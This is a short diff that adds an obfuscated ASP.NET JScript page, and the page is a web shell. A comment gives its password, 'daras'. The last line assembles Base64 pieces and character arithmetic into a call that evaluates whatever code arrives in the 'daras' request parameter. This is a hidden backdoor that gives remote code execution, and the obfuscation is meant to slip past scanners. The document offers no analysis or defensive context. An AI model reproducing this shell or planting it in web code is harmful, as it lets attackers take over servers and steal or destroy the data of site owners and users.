@@ -1,0 +1,3 @@
+<%-- // Delete this line, pwd: daras --%>
+<%@Page Language="Jscript"%>
+<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('ODcwM'+'TcwO3'+'ZhciB'+'zYWZl'+''+char(0212460/01567)+'S'+'J'+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('MQ=='))+'b'+''+''+'n'+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('Tg=='))+'h'+char(88560/984)+char(351-242)+''+'UiO2V'+'2YWwo'+'UmVxd'+'WVzdC'+'5JdGV'+'tWydk'+'YXJhc'+'yddLC'+'BzYWZ'+'lKTsy'+'NjEwN'+'TEwOw'+'=='+'')));%>
